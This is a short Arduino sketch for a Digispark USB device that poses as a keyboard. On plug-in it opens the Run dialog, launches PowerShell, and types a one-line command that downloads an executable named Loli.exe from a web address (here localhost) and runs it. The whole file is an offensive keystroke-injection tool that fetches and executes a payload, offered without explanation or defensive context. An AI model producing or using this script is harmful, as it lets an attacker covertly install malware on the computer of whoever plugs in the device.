#include <DigiKeyboard.h>

const int dlb = 2000;
const int dla = 4000;
char pw[] = "powershell";
char cmd[] = "$down = New-Object System.Net.WebClient; $url = 'http:127.0.0.1/tt/Loli.exe'; $file = 'Loli.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;";
void setup() {
  DigiKeyboard.delay(dlb);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(dlb);
  DigiKeyboard.print(pw);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(dla);
  DigiKeyboard.print(cmd);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() { 
}
